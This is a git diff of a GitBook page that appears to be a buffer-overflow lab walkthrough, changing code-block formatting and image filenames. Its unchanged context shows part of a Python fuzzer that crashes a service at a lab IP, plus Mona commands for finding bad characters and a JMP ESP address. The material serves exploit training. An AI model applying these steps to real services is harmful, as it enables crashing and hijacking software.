@@ -58,9 +58,8 @@ Place the following into the debugger window of Immunity:
 
 * Create a file on Kali called <mark style="color:yellow;">00fuzzer.py</mark> with the following contents:
 
-```
-#!/usr/bin/env python3
-
+<pre><code><strong>#!/usr/bin/env python3
+</strong>
 import socket, time, sys
 
 ip = "10.10.253.98"
@@ -84,8 +83,7 @@ while True:
     print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
     sys.exit(0)
   string += 100 * "A"
-  time.sleep(1)
-```
+  time.sleep(1)</code></pre>
 
 ### What does this script do?
 
@@ -231,11 +229,11 @@ Example:
 !mona bytearray -b "\x00"
 ```
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 * Select <mark style="color:yellow;">Window > 8 CPU</mark>&#x20;
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 * Find the ESP value and right-click and select "Copy selection to clipboard"
 
@@ -249,7 +247,7 @@ Now, use this Mona module with the ESP value that you just obtained:
 !mona compare -f C:\mona\oscp\bytearray.bin -a 0198FA30
 ```
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (4).png" alt=""><figcaption></figcaption></figure>
 
 * This will come up with a list of bad chars
 * <mark style="color:yellow;">NOTE: Not all of these may be bad chars! Sometimes bad chars cause the next byte to get corrupted as well and effect the rest of the string</mark>
@@ -269,7 +267,7 @@ Add the \x07 bad char:
 
 <figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption><p>Original file with x07</p></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>x07 removed</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (2).png" alt=""><figcaption><p>x07 removed</p></figcaption></figure>
 
 * Save the modified file
 * Run the exploit once more
@@ -326,7 +324,7 @@ With the program running in a crashed or running state, run the following Mona c
 !mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
 ```
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (3).png" alt=""><figcaption></figcaption></figure>
 
 * You will see results that you can use for the next step. In this case, we get 9 pointers.
   * We will use the first one: <mark style="color:yellow;">625011af</mark>
